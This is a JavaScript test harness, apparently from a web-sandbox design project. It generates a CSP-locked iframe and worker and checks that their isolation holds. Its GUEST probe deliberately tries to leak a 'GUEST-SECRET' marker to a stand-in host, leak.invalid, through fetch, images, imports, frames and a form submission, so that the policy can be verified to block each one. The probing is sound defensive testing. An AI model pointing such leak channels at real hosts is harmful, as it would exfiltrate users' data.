// The served file of docs/design/03-served-document.md as the design draws it, as plain HTML (no library code), and the
// host page that frames it in the design's start-up order.
//
//   host page (H): a custom element with a closed shadow root holds
//     <iframe sandbox="allow-scripts allow-forms" src=documentUrl>                                F
//   F: a static file; its <meta> policy is the first element of <head>; its one script is the guard (synchronous, no
//      listener): if it is not opaque or is the top-level document, window.stop(). Then, in F's static markup,
//     <iframe sandbox="allow-scripts allow-forms allow-orientation-lock" srcdoc="…">              C, the view
//   C: the still stylesheet (by hash) and one bootstrap script (by hash). It answers the first message whose source is
//      parent.parent and that brings a port: it computes its own bootstrap's hash, runs the gates (research 28 Q7's
//      canaries without the frame canary) and the policy check (I18: one load of each kind the view makes, while
//      listening for securitypolicyviolation), starts the blob: worker, which runs the worker's gates and its policy
//      check, and answers on the port with the hash and every verdict. Only then does H send content on the port.
//
// The policy check compares each violation's originalPolicy with the file's <meta> text. C cannot hold its own hash, so
// it holds the <meta> as a template with one hole for it and fills the hole with the hash it computes of its own text.
// Every URL a canary uses is a blob: URL the realm minted, or data:; every text is a fixed string of this file.
import { esc, sha } from '../28_served_topology/lib.mjs';

export const STILL = '#still { color: rgb(7, 8, 9) }';
export const GUARD = `if (!(self.origin === 'null' && top !== self)) window.stop();`;
const HOLE = '__C_HASH__';
// a 1x1 PNG
const PNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

/** F's <meta> policy, the design's constant text (03, "Inside the file"), with `cHash` for the view's bootstrap. */
export function metaPolicy(cHash, weaken = null) {
    const d = {
        'default-src': "'none'", 'script-src': `${sha(GUARD)} ${cHash}`, 'script-src-attr': "'none'", 'style-src': `${sha(STILL)} blob:`,
        'img-src': 'blob:', 'font-src': 'blob:', 'media-src': 'blob:', 'connect-src': "'none'", 'worker-src': 'blob:',
        'frame-src': "'none'", 'object-src': "'none'", 'base-uri': "'none'", 'form-action': "'none'", 'manifest-src': "'none'",
    };
    if (weaken) Object.assign(d, typeof weaken === 'function' ? weaken(d) : weaken);
    return Object.entries(d).map(([k, v]) => `${k} ${v}`).join('; ');
}

// Research 28 Q7's gates, without the frame canary (03: "Left out"). One async function for a document or a worker.
export const GATES = `async (where) => {
  const g = {};
  const isDoc = typeof document !== 'undefined';
  const within = (p, ms, late) => Promise.race([p, new Promise((r) => setTimeout(() => r(late), ms))]);
  const throwsHeld = (f) => { try { f(); return 'broken: did not throw'; } catch (e) { return 'held'; } };
  g.opaque = String(self.origin) === 'null' ? 'held' : 'broken: ' + self.origin;
  g.stringCode = throwsHeld(() => new Function(''));
  const blob = URL.createObjectURL(new Blob(['x'], { type: 'text/plain' }));
  g.connect = await within(fetch(blob).then(() => 'broken: fetched', () => 'held'), 2000, 'broken: no answer');
  if (isDoc) {
    g.image = await within(new Promise((r) => { const i = new Image(); i.onload = () => r('broken: loaded'); i.onerror = () => r('held'); i.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'); }), 2000, 'broken: no answer');
    const p = document.createElement('p'); p.id = 'gstyle'; document.body.append(p);
    const s = document.createElement('style'); s.textContent = '#gstyle { color: rgb(9, 9, 9) }'; document.head.append(s);
    let c = ''; for (let i = 0; i < 50 && (c = getComputedStyle(p).color) === ''; i++) await new Promise((r) => setTimeout(r, 20));
    g.style = c === '' ? 'broken: unmeasured' : c === 'rgb(9, 9, 9)' ? 'broken: applied' : 'held';
    s.remove(); p.remove();
    const before = document.baseURI;
    const b = document.createElement('base'); b.href = 'http://gate.invalid/'; document.head.append(b);
    g.base = document.baseURI === before ? 'held' : 'broken: ' + document.baseURI.slice(0, 30);
    b.remove();
    g.cookie = (() => { try { document.cookie = 'wsgate=1; path=/; max-age=5'; return document.cookie.includes('wsgate=1') ? 'broken: kept' : 'held'; } catch (e) { return 'held'; } })();
    g.storage = throwsHeld(() => localStorage.length);
    g.parent = throwsHeld(() => parent.document.title);
  } else {
    g.storage = throwsHeld(() => indexedDB.open('gate'));
  }
  return g;
}`;

// The policy check's canaries (I18): one load of each kind the view or the worker makes for a guest, with fixed strings.
// Document: VIEW_LOAD_KINDS (style, image, font, media, track) as blob: loads, a refused request, code from a string,
// an import(), a Trusted Types sink the view writes (a template's innerHTML). Worker: a refused request, code from a
// string, an import(), importScripts. The blob: worker itself is the worker kind (C records whether it started).
export const CHECK = `async (ev) => {
  const L = {};
  const isDoc = typeof document !== 'undefined';
  const mint = (parts, type) => URL.createObjectURL(new Blob(parts, { type }));
  const within = (p, ms) => Promise.race([p, new Promise((r) => setTimeout(() => r('no answer in ' + ms + ' ms'), ms))]);
  const pend = [];
  const T = {};
  const t0 = performance.now();
  const run = (k, f, ms = 1500) => pend.push(within(Promise.resolve().then(f), ms).then((v) => { L[k] = v; }, (e) => { L[k] = 'throws ' + (e && e.name); }).then(() => { T[k] = Math.round(performance.now() - t0); }));
  run('request', () => fetch(mint(['x'], 'text/plain')).then(() => 'fetched', () => 'refused'));
  run('stringCode', () => { try { (0, eval)('1'); return 'ran'; } catch (e) { return 'refused'; } });
  run('import', () => import(mint(['export default 1'], 'text/javascript')).then(() => 'loaded', () => 'refused'));
  run('trustedTypesPolicy', () => (self.trustedTypes ? (trustedTypes.createPolicy('web-sandbox-check', { createHTML: (s) => s, createScriptURL: (s) => s }), 'created') : 'no trustedTypes'));
  if (isDoc) {
    const png = Uint8Array.from(atob('${PNG_B64}'), (c) => c.charCodeAt(0));
    run('image', () => new Promise((r) => { const i = new Image(); i.onload = () => r('loaded'); i.onerror = () => r('error'); i.src = mint([png], 'image/png'); }));
    run('style', () => new Promise((r) => { const p = document.createElement('p'); p.id = 'pcs'; document.body.append(p); const l = document.createElement('link'); l.rel = 'stylesheet'; l.onload = () => r(getComputedStyle(p).color === 'rgb(1, 2, 3)' ? 'applied' : 'loaded, not applied'); l.onerror = () => r('error'); l.href = mint(['#pcs { color: rgb(1, 2, 3) }'], 'text/css'); document.head.append(l); }));
    run('font', () => new FontFace('wscheck', 'url(' + mint(['wOF2'], 'font/woff2') + ')').load().then(() => 'loaded', (e) => 'error ' + e.name));
    run('media', () => new Promise((r) => { const a = document.createElement('audio'); a.preload = 'auto'; a.onloadedmetadata = () => r('loaded'); a.onerror = () => r('error'); a.src = mint(['RIFF'], 'audio/wav'); document.body.append(a); }), 600);
    run('track', () => new Promise((r) => { const v = document.createElement('video'); const t = document.createElement('track'); t.kind = 'captions'; t.default = true; t.onload = () => r('loaded'); t.onerror = () => r('error'); t.src = mint(['WEBVTT\\n\\n'], 'text/vtt'); v.append(t); document.body.append(v); t.track.mode = 'hidden'; }), 600);
    run('trustedTypesSink', () => { const t = document.createElement('template'); t.innerHTML = '<b>check</b>'; return 'accepted'; });
  } else {
    run('importScripts', () => { try { importScripts(mint(['1'], 'text/javascript')); return 'loaded'; } catch (e) { return 'refused ' + e.name; } });
  }
  await Promise.all(pend);
  await new Promise((r) => setTimeout(r, 30));
  // the twin canary: one refused request alone, after every other event has arrived; the file's policy raises exactly one
  // event for it, so two mean a second policy that refuses it too (the <meta>'s own text in a header)
  const before = ev.length;
  await fetch(mint(['twin'], 'text/plain')).catch(() => {});
  await new Promise((r) => setTimeout(r, 30));
  L.twin = ev.length - before;
  T.twin = Math.round(performance.now() - t0);
  Object.defineProperty(L, 'ms', { value: T, enumerable: true });
  return L;
}`;

// What an admitted canary must do under the file's own policy, and what a refused one must do; anything else is a policy
// that is not the file's (or no policy).
export const EXPECT = { trustedTypesPolicy: 'created', request: 'refused', stringCode: 'refused', import: 'refused', image: 'loaded', style: 'applied', trustedTypesSink: 'accepted', importScripts: 'refused NetworkError' };

// Reads the events against the expected text: foreign text, a report disposition, the same event twice, an admitted
// load refused, or a refused one admitted.
export const VERDICT = `(expected, events, loads, extra) => {
  const norm = (p) => String(p).split(';').map((d) => d.trim().replace(/\\s+/g, ' ')).filter(Boolean).sort().join('; ');
  const mine = norm(expected);
  const foreign = events.filter((e) => norm(e.policy) !== mine || e.disp !== 'enforce');
  // the same event twice: the twin canary raised more than one (Firefox gives asynchronous loads no source position,
  // so two different canaries can look alike; only a canary run alone can be counted)
  const dup = 'twin' in loads && loads.twin > 1 ? ['twin raised ' + loads.twin] : [];
  const EXPECT = ${JSON.stringify(EXPECT)};
  const off = Object.entries(EXPECT).filter(([k, v]) => k in loads && !(loads[k] === v || (k === 'importScripts' && String(loads[k]).startsWith('refused')))).map(([k]) => k + ': ' + loads[k]);
  for (const x of extra || []) off.push(x);
  const exact = events.filter((e) => e.policy === expected).length;
  return { clean: !foreign.length && !dup.length && !off.length, foreign: foreign.length, duplicates: dup.length, off, events: events.length, exactText: exact };
}`;

const VIOL = `(e) => ({ dir: e.effectiveDirective || e.violatedDirective, disp: e.disposition, blocked: String(e.blockedURI).slice(0, 50), line: e.lineNumber, col: e.columnNumber, sample: String(e.sample || '').slice(0, 40), policy: e.originalPolicy, t: Math.round(performance.now()) })`;

/** The worker's source: constant, a string inside C's bootstrap. It listens first, runs its gates and its check, then the allowlist step and the names gate. */
export function workerSource({ gates = true, check = true, allowlist = true } = {}) {
    return `const ev = []; self.addEventListener('securitypolicyviolation', (e) => ev.push((${VIOL})(e)));
self.onmessage = async (m) => {
  if (m.data && m.data.cmd === 'guest') { const from = ev.length; const r = await (${GUEST})(); postMessage({ guest: r, events: ev.slice(from).map((e) => ({ ...e, policy: e.policy.slice(0, 120) })) }); return; }
  if (m.data && m.data.cmd) return;
  const expected = m.data.expected;
  const g = ${gates ? `await (${GATES})('W')` : '{}'};
  const loads = ${check ? `await (${CHECK})(ev)` : '{}'};
  ${allowlist ? "for (const n of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts']) { try { delete self[n]; } catch {} try { if (n in self) Object.defineProperty(self, n, { value: undefined, configurable: true }); } catch {} }" : ''}
  ${gates ? "const left = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts'].filter((n) => typeof self[n] !== 'undefined'); g.names = left.length ? 'broken: ' + left.join(',') : 'held';" : ''}
  const check = ${check ? `(${VERDICT})(expected, ev, loads)` : '{ clean: true, skipped: true }'};
  postMessage({ gates: g, check, loads, events: ev.map((e) => ({ ...e, policy: e.policy === expected ? '(the meta, exact)' : e.policy.slice(0, 160) })) });
};`;
}

/**
 * C's bootstrap: one constant text per variant. `version` stands for the library version (a file of another version is
 * another text, so another hash). `commands` are this probe's content messages (a form, the flags), answered after the
 * start-up, on the port.
 */
export function cScript({ gates = true, check = true, allowlist = true, version = '1', scriptExtra = '', first = false, reloadAfterPost = false } = {}) {
    if (first) return cScriptFirst({ gates, check, allowlist, version, scriptExtra, reloadAfterPost });
    const policyTemplate = metaPolicy(HOLE, withScripts(scriptExtra));
    return `(() => {
const VERSION = ${JSON.stringify(version)};
const SELF = document.currentScript.textContent;
const ev = []; document.addEventListener('securitypolicyviolation', (e) => ev.push((${VIOL})(e)));
const ignored = [];
let taken = false;
addEventListener('message', async (e) => {
  if (taken) return;
  if (e.source !== parent.parent || !e.ports[0] || e.data !== 'ws-hello') { ignored.push(e.source === parent.parent ? 'from parent.parent, malformed' : 'not from parent.parent'); return; }
  taken = true;
  const t0 = performance.now();
  const port = e.ports[0];
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(SELF)));
  const hash = "'sha256-" + btoa(String.fromCharCode(...digest)) + "'";
  const expected = ${JSON.stringify(policyTemplate)}.replace(${JSON.stringify(HOLE)}, hash);
  const ph = { hash: Math.round(performance.now() - t0) };
  // the worker starts first and runs its gates and its check while C runs its own
  let worker = null;
  const pendingW = new Promise((res) => {
    let w;
    try { w = worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(workerSource({ gates, check, allowlist }))}], { type: 'text/javascript' }))); }
    catch (x) { res({ started: 'throws ' + x.name }); return; }
    w.onmessage = (m) => res({ started: 'yes', ...m.data });
    w.onerror = () => res({ started: 'error event (not started)' });
    w.postMessage({ expected });
    setTimeout(() => res({ started: 'no answer in 3 s' }), 3000);
  });
  const g = ${gates ? `await (${GATES})('C')` : '{}'};
  ph.gates = Math.round(performance.now() - t0);
  const loads = ${check ? `await (${CHECK})(ev)` : '{}'};
  ph.check = Math.round(performance.now() - t0);
  const W = await pendingW;
  ph.worker = Math.round(performance.now() - t0);
  const extra = W.started === 'yes' ? [] : ['worker: ' + W.started];
  const check = ${check ? `(${VERDICT})(expected, ev, loads, extra)` : '{ clean: W.started === "yes", skipped: true }'};
  port.postMessage({ version: VERSION, hash, ms: performance.now() - t0, phases: ph, ignored: ignored.slice(), C: { gates: g, check, loads, events: ev.map((v) => ({ ...v, policy: v.policy === expected ? '(the meta, exact)' : v.policy.slice(0, 160) })) }, W });
  port.onmessage = async (m) => {
    const d = m.data || {};
    if (d.cmd === 'content') { port.postMessage({ ack: 'content', bytes: String(d.body).length }); return; }
    if (d.cmd === 'form') {
      // a form of the guest's: the view counts submit and keeps the document (preventDefault)
      const f = document.createElement('form'); const i = document.createElement('input'); i.name = 'q'; i.id = 'q'; const b = document.createElement('button'); b.type = 'submit'; b.id = 'go'; b.textContent = 'Go';
      b.style.cssText = 'display:block;width:120px;height:40px'; i.style.cssText = 'display:block;width:120px;height:24px';
      f.append(i, b); document.body.append(f);
      window.submits = 0; f.addEventListener('submit', (x) => { x.preventDefault(); window.submits++; port.postMessage({ submit: window.submits, trusted: x.isTrusted }); });
      port.postMessage({ ack: 'form' });
      return;
    }
    if (d.cmd === 'flags') port.postMessage({ flags: await (${FLAGS})() });
    if (d.cmd === 'guest') {
      const from = ev.length;
      const inC = await (${GUEST})();
      const inW = await new Promise((res) => { if (!worker) { res('no worker'); return; } worker.onmessage = (x) => res(x.data); worker.postMessage({ cmd: 'guest' }); setTimeout(() => res('no answer'), 3000); });
      port.postMessage({ guest: { C: inC, events: ev.slice(from).map((v) => ({ ...v, policy: v.policy.slice(0, 120) })), W: inW } });
      // last, after the answer: a form submission, which on Chromium took C to an error page (the document is gone after it)
      setTimeout(() => { const f = document.createElement('form'); f.action = 'http://leak.invalid/GUEST-SECRET-FORM'; f.method = 'get'; document.body.append(f); f.requestSubmit(); }, 50);
    }
  };
}, false);
})();`;
}

/** The <meta>'s `script-src` with more hashes (a file whose F or a second frame has a script of its own: Q7's forgeries). */
const withScripts = (extra) => (extra ? (d) => ({ 'script-src': `${d['script-src']} ${extra}` }) : null);

/**
 * C's bootstrap in the order "the view speaks first" (Q7, 03 "Who receives the first port"): at its own start C runs its
 * gates and its check (the same as cScript's), posts `{ version, verdicts }` to parent.parent with target origin '*', and
 * takes the first message from parent.parent that is 'ws-port' with a port. On that port it then answers what cScript
 * answers (content, form, flags, guest), first with `{ hello: 'port received', doc }`, where `doc` names this document.
 * Its listener is added before anything else, so a port that arrives while it still runs its gates is kept.
 * `reloadAfterPost`: right after its post, C reloads itself once (window.name marks the second document), for Q7 (f).
 */
function cScriptFirst({ gates, check, allowlist, version, scriptExtra, reloadAfterPost }) {
    const policyTemplate = metaPolicy(HOLE, withScripts(scriptExtra));
    return `(() => {
const VERSION = ${JSON.stringify(version)};
const SELF = document.currentScript.textContent;
const DOC = Math.random().toString(36).slice(2, 10);
const ev = []; document.addEventListener('securitypolicyviolation', (e) => ev.push((${VIOL})(e)));
const ignored = [];
let portEvent = null;
let onPort = null;
addEventListener('message', (e) => {
  if (portEvent) return;
  if (e.source !== parent.parent || !e.ports[0] || e.data !== 'ws-port') { ignored.push(e.source === parent.parent ? 'from parent.parent, malformed' : 'not from parent.parent'); return; }
  portEvent = e;
  if (onPort) onPort(e);
}, false);
(async () => {
  const t0 = performance.now();
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(SELF)));
  const hash = "'sha256-" + btoa(String.fromCharCode(...digest)) + "'";
  const expected = ${JSON.stringify(policyTemplate)}.replace(${JSON.stringify(HOLE)}, hash);
  const ph = { hash: Math.round(performance.now() - t0) };
  let worker = null;
  const pendingW = new Promise((res) => {
    let w;
    try { w = worker = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(workerSource({ gates, check, allowlist }))}], { type: 'text/javascript' }))); }
    catch (x) { res({ started: 'throws ' + x.name }); return; }
    w.onmessage = (m) => res({ started: 'yes', ...m.data });
    w.onerror = () => res({ started: 'error event (not started)' });
    w.postMessage({ expected });
    setTimeout(() => res({ started: 'no answer in 3 s' }), 3000);
  });
  const g = ${gates ? `await (${GATES})('C')` : '{}'};
  ph.gates = Math.round(performance.now() - t0);
  const loads = ${check ? `await (${CHECK})(ev)` : '{}'};
  ph.check = Math.round(performance.now() - t0);
  const W = await pendingW;
  ph.worker = Math.round(performance.now() - t0);
  const extra = W.started === 'yes' ? [] : ['worker: ' + W.started];
  const check = ${check ? `(${VERDICT})(expected, ev, loads, extra)` : '{ clean: W.started === "yes", skipped: true }'};
  // the announcement: the library's version and the verdicts, nothing else
  const verdicts = { C: { gates: g, check }, W: { started: W.started, gates: W.gates, check: W.check } };
  parent.parent.postMessage({ version: VERSION, verdicts }, '*');
  const posted = performance.now();
  ${reloadAfterPost ? "if (window.name !== 'reloaded') { window.name = 'reloaded'; location.reload(); return; }" : ''}
  onPort = (e) => {
    const port = e.ports[0];
    port.postMessage({ hello: 'port received', doc: DOC, reloaded: window.name === 'reloaded', msAfterPost: Math.round(performance.now() - posted), ms: performance.now() - t0, phases: ph, hash, ignored: ignored.slice(), C: { loads, events: ev.map((v) => ({ ...v, policy: v.policy === expected ? '(the meta, exact)' : v.policy.slice(0, 160) })) }, W });
    port.onmessage = (m) => {
      const d = m.data || {};
      if (d.cmd === 'content') port.postMessage({ ack: 'content', bytes: String(d.body).length, doc: DOC });
    };
  };
  if (portEvent) onPort(portEvent);
})();
})();`;
}

// What a guest could make the view or the worker do after a clean start-up, each carrying a marker of its own in a URL
// or in the text a 'report-sample' copies (Q3: which outside policies the check does not see still report these?).
// Every URL is under .invalid (never resolved) and the file's own policy refuses every one of them.
export const GUEST = `async () => {
  const S = 'GUEST-SECRET';
  const U = (k) => 'http://leak.invalid/' + S + '-' + k;
  const R = {};
  const t = (k, f) => { try { R[k] = f() ?? 'done'; } catch (e) { R[k] = 'throws ' + e.name; } };
  const isDoc = typeof document !== 'undefined';
  t('eval', () => { try { (0, eval)('/* ' + S + '-EVAL */ 1'); return 'ran'; } catch (e) { return 'refused'; } });
  t('import', () => { import(U('IMPORT')).catch(() => {}); });
  if (isDoc) {
    t('imgHttp', () => { const i = new Image(); i.src = U('IMG'); });
    t('imgData', () => { const i = new Image(); i.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg"><desc>' + S + '-DATA</desc></svg>'); });
    t('styleElement', () => { const s = document.createElement('style'); s.textContent = '/* ' + S + '-STYLE */ p { color: red }'; document.head.append(s); });
    t('styleAttribute', () => { const p = document.createElement('p'); p.setAttribute('style', 'color: red; /* ' + S + '-ATTR */'); document.body.append(p); });
    t('stylesheetHttp', () => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = U('CSS'); document.head.append(l); });
    t('fontHttp', () => { new FontFace('g', 'url(' + U('FONT') + ')').load().catch(() => {}); });
    t('mediaHttp', () => { const a = document.createElement('audio'); a.src = U('MEDIA'); document.body.append(a); });
    t('fetchHttp', () => { fetch(U('FETCH')).catch(() => {}); });
    t('frame', () => { const f = document.createElement('iframe'); f.src = U('FRAME'); document.body.append(f); });
    t('object', () => { const o = document.createElement('object'); o.data = U('OBJECT'); document.body.append(o); });
    t('base', () => { const b = document.createElement('base'); b.href = U('BASE') + '/'; document.head.append(b); b.remove(); });
    t('manifest', () => { const l = document.createElement('link'); l.rel = 'manifest'; l.href = U('MANIFEST'); document.head.append(l); });
    t('handlerAttribute', () => { const b = document.createElement('button'); b.setAttribute('onclick', '/* ' + S + '-HANDLER */'); document.body.append(b); b.click(); });
    t('trustedTypesSink', () => { const x = document.createElement('template'); x.innerHTML = '<b>' + S + '-TT</b>'; });
    t('workerHttp', () => { new Worker(U('WORKER')); });
  } else {
    t('function', () => { try { new Function('/* ' + S + '-FUNCTION */'); return 'ran'; } catch (e) { return 'refused'; } });
  }
  await new Promise((r) => setTimeout(r, 300));
  return R;
}`;

// What C can do with each sandbox flag it might gain from F's attribute (Q4): a popup, a top navigation, a modal, its
// origin, a download, pointer lock. Run on a content command, so a real click can come first.
const FLAGS = `async () => {
  const R = { origin: String(self.origin) };
  try { const w = window.open('about:blank', '_blank'); R.popup = w ? 'opened' : 'null'; if (w) w.close(); } catch (e) { R.popup = 'throws ' + e.name; }
  try { R.alert = (() => { const t = Date.now(); alert('flag probe'); return 'returned after ' + (Date.now() - t) + ' ms'; })(); } catch (e) { R.alert = 'throws ' + e.name; }
  try { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x'])); a.download = 'probe.txt'; document.body.append(a); a.click(); R.download = 'clicked'; } catch (e) { R.download = 'throws ' + e.name; }
  try { top.location.href = 'about:blank#probe'; R.topNavigation = 'no throw'; } catch (e) { R.topNavigation = 'throws ' + e.name; }
  return R;
}`;

/** C's document: the still sheet, then the bootstrap. */
export function cDocument(script) {
    return `<!doctype html><html><head><meta charset="utf-8"><style>${STILL}</style></head><body><p id="still">still</p><script>${script}</script></body></html>`;
}

/**
 * F, the served file. Options: `meta` (false: no <meta>), `weaken` (directives replaced in the <meta>), `guard` (false:
 * no guard script), `c` (cScript options), `cAttr` (C's sandbox attribute).
 */
export function servedFile({ meta = true, weaken = null, guard = true, c = {}, cAttr = 'allow-scripts allow-forms allow-orientation-lock', script: own = null, fScripts = [], extraFrames = [] } = {}) {
    // `script`: C's bootstrap in place of cScript's (Q6's canaries). `fScripts`: scripts of F's own after the guard, and
    // `extraFrames` ({ attr, scripts }): srcdoc frames after C; their hashes join the <meta>'s script-src (Q7's forgeries)
    const extra = [...fScripts, ...extraFrames.flatMap((x) => x.scripts)].map(sha).join(' ');
    const script = own ?? cScript({ ...c, scriptExtra: extra });
    const cHash = sha(script);
    const policy = extra ? metaPolicy(cHash, (d) => ({ ...withScripts(extra)(d), ...(typeof weaken === 'function' ? weaken(d) : weaken || {}) })) : metaPolicy(cHash, weaken);
    const fOwn = fScripts.map((x) => `<script>${x}</script>`).join('');
    const more = extraFrames.map((x) => `<iframe sandbox="${x.attr ?? cAttr}" srcdoc="${esc(`<!doctype html><meta charset="utf-8">${x.scripts.map((y) => `<script>${y}</script>`).join('')}`)}"></iframe>`).join('');
    const html = `<!doctype html><html><head>${meta ? `<meta http-equiv="Content-Security-Policy" content="${esc(policy)}">` : ''}<meta charset="utf-8">${guard ? `<script>${GUARD}</script>` : ''}${fOwn}</head><body><iframe sandbox="${cAttr}" srcdoc="${esc(cDocument(script))}"></iframe>${more}</body></html>`;
    return { html, policy, cHash, script };
}

/**
 * The host page H: `window.start(url, opts)` inserts a <web-sandbox-probe> whose closed shadow root holds the frame of F,
 * runs the start-up order and resolves with what H saw. `opts`: `attrs` (F's sandbox attribute), `expectHash` (H's
 * viewScriptHash), `srcdoc` (today's view shape: the wrapper as srcdoc instead of src), `intruder` (a sibling frame posts
 * the hello first), `keep` (leave the element in the page), `send` (false: do not send content even on a clean verdict),
 * `first` (Q7's order: the view speaks first; with `postTo`, `answerDelay`, `expectVersion`), `busy` (ms of a busy main
 * thread right after insertion).
 */
export function hostPage(expectHash) {
    return `<!doctype html><html><head><meta charset="utf-8"><title>host</title></head><body><script>
window.hostViolations = [];
document.addEventListener('securitypolicyviolation', (e) => hostViolations.push({ dir: e.effectiveDirective, blocked: String(e.blockedURI).slice(0, 60) }));
customElements.define('web-sandbox-probe', class extends HTMLElement {});
window.EXPECT_HASH = ${JSON.stringify(expectHash)};
window.last = null;
window.start = (url, opts = {}) => new Promise((resolve) => {
  const attrs = 'attrs' in opts ? opts.attrs : 'allow-scripts allow-forms'; // null: no sandbox attribute
  const el = document.createElement('web-sandbox-probe');
  const root = el.attachShadow({ mode: 'closed' });
  const f = document.createElement('iframe');
  if (attrs !== null) f.setAttribute('sandbox', attrs);
  if (opts.referrerpolicy) f.setAttribute('referrerpolicy', opts.referrerpolicy);
  f.style.cssText = 'border:0;width:320px;height:170px';
  const R = window.last = { loads: [], hello: null, verdict: null, decision: null, acks: [], messages: [], timeline: {} };
  const now = () => +(performance.now() - t0).toFixed(1);
  let ended = false;
  const end = (why) => { if (ended) return; ended = true; R.end = why; R.timeline.end = now(); R.hostViolations = hostViolations.slice(); hostViolations.length = 0; if (opts.first) removeEventListener('message', onFirst); if (!opts.keep) setTimeout(() => el.remove(), 50); resolve(R); };
  const ch = new MessageChannel();
  window.lastPort = ch.port1;
  ch.port1.onmessage = (m) => {
    const d = m.data;
    R.messages.push(Object.keys(d || {}).join(','));
    if (!R.verdict) {
      R.verdict = d; R.timeline.verdict = now(); R.verdictEpoch = performance.timeOrigin + performance.now();
      const bad = [];
      if (d.hash !== (opts.expectHash ?? window.EXPECT_HASH)) bad.push('hash');
      for (const [realm, v] of [['C', d.C], ['W', d.W]]) {
        for (const [k, s] of Object.entries((v && v.gates) || {})) if (String(s).startsWith('broken')) bad.push(realm + '.' + k);
        if (!v || !v.check || !v.check.clean) bad.push(realm + '.policy');
      }
      if (!d.W || d.W.started !== 'yes') bad.push('W.started');
      R.decision = bad.length ? { refused: bad } : 'send';
      if (bad.length || opts.send === false) { setTimeout(() => end(bad.length ? 'refused' : 'verdict'), 20); return; }
      ch.port1.postMessage({ cmd: 'content', body: 'the app' });
      return;
    }
    R.acks.push(d);
    if (d.ack === 'content') { R.timeline.content = now(); if (!opts.keep) end('content acknowledged'); else end('content acknowledged'); }
  };
  // opts.first (Q7, "the view speaks first"): H posts nothing at load. A listener added before the frame is inserted
  // takes the first { version, verdicts } whose source is frame.contentWindow[0], and only then posts the port to
  // event.source (opts.postTo 'index': to frame.contentWindow[0] again), after opts.answerDelay ms
  R.firstMessages = [];
  const compare = (src) => {
    const c = {};
    const t = (k, fn) => { try { c[k] = fn(); } catch (x) { c[k] = 'throws ' + x.name; } };
    const w = f.contentWindow;
    t('index', () => src === w[0]); t('frames', () => src === w.frames[0]); t('parent', () => src != null && src.parent === w); t('self', () => src === w);
    return c;
  };
  const onFirst = (e) => {
    const rec = { t: now(), keys: Object.keys(e.data || {}).join(','), cmp: compare(e.source) };
    R.firstMessages.push(rec);
    if (ended || R.verdict || rec.cmp.index !== true) return;
    const d = e.data;
    if (!d || typeof d !== 'object' || !('version' in d) || !d.verdicts) return;
    rec.accepted = true;
    R.verdict = d; R.timeline.verdict = now(); R.verdictEpoch = performance.timeOrigin + performance.now();
    const bad = [];
    if (d.version !== (opts.expectVersion ?? '1')) bad.push('version');
    for (const [realm, v] of [['C', d.verdicts.C], ['W', d.verdicts.W]]) {
      for (const [k, s] of Object.entries((v && v.gates) || {})) if (String(s).startsWith('broken')) bad.push(realm + '.' + k);
      if (!v || !v.check || !v.check.clean) bad.push(realm + '.policy');
    }
    if (!d.verdicts.W || d.verdicts.W.started !== 'yes') bad.push('W.started');
    R.decision = bad.length ? { refused: bad } : 'send';
    if (bad.length || opts.send === false) { setTimeout(() => end(bad.length ? 'refused' : 'verdict'), 20); return; }
    const source = e.source;
    const answer = () => {
      R.portTo = opts.postTo === 'index' ? 'frame.contentWindow[0]' : 'event.source';
      try { (opts.postTo === 'index' ? f.contentWindow[0] : source).postMessage('ws-port', '*', [ch.port2]); R.hello = 'port posted'; } catch (x) { R.hello = 'port post throws ' + x.name; }
      R.timeline.hello = now();
      ch.port1.postMessage({ cmd: 'content', body: 'the app' });
    };
    if (opts.answerDelay) setTimeout(answer, opts.answerDelay); else answer();
  };
  if (opts.first) addEventListener('message', onFirst);
  const readIndex = () => { try { const x = f.contentWindow[0]; return x === undefined ? 'undefined' : x === null ? 'null' : 'a window'; } catch (x) { return 'throws ' + x.name; } };
  f.addEventListener('load', () => {
    const w = f.contentWindow;
    let length = null; try { length = w.length; } catch (e) { length = 'throws ' + e.name; }
    R.loads.push(opts.first ? { t: now(), length, index: readIndex() } : { t: now(), length });
    if (opts.first) return;
    if (R.hello) return;
    let target = null; try { target = w.frames[0] || null; } catch (e) { R.hello = 'frames[0] throws ' + e.name; return; }
    if (!target) { R.hello = 'no frames[0] at load'; return; }
    if (opts.intruder) {
      const i = document.createElement('iframe');
      i.srcdoc = '<script>window.go = (t) => { const c = new MessageChannel(); window.got = []; c.port1.onmessage = (m) => got.push(m.data); t.postMessage("ws-hello", "*", [c.port2]); };<\\/script>';
      i.onload = () => { i.contentWindow.go(target); R.intruder = i; setTimeout(() => { target.postMessage('ws-hello', '*', [ch.port2]); R.hello = 'posted after the intruder'; R.timeline.hello = now(); }, 100); };
      document.body.append(i);
      return;
    }
    target.postMessage('ws-hello', '*', [ch.port2]);
    R.hello = 'posted'; R.timeline.hello = now();
  });
  if (opts.first) R.indexBeforeInsertion = readIndex();
  if (opts.light) el.append(f); else root.append(f); // light: the frame outside the shadow root (Q5's positive control)
  const t0 = performance.now();
  if (opts.srcdoc) f.srcdoc = opts.srcdoc; else f.src = url;
  document.body.append(el);
  if (opts.first) R.indexAtInsertion = readIndex();
  if (opts.busy) { const b = performance.now(); while (performance.now() - b < opts.busy); } // a slow host page: its main thread busy at insertion
  setTimeout(() => end('no answer in ' + (opts.timeout ?? 6000) + ' ms'), opts.timeout ?? 6000);
});
window.intruderGot = () => (window.last && window.last.intruder ? window.last.intruder.contentWindow.got : null);
// what H can read of documentUrl from outside the frame: a fetch of its own
